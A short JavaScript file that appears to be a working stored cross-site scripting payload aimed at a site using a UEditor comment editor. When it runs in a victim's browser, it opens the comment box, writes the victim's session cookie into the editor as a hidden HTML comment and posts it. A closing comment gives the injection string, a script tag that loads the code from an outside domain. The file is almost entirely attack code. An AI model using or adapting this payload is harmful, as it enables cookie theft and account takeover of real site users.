

function stt(){
    var iframe = document.getElementById("ueditor_1");
    var elmnt = iframe.contentWindow;
    elmnt.document.getElementsByClassName("view")[1].getElementsByTagName("p")[0].innerHTML="<!-- "+document.cookie+"-->&nbsp;";
    return;
}

function test(){
    alert("start");
    document.getElementsByClassName("comPic")[0].click();
    setTimeout(stt,2000);
    return;
}

if(typeof ononon == 'undefined')
{
ononon=0;
setTimeout(test, 3000);
}

//payloads       <script src="https://www.galliumwang.xyz/new.js"></script>

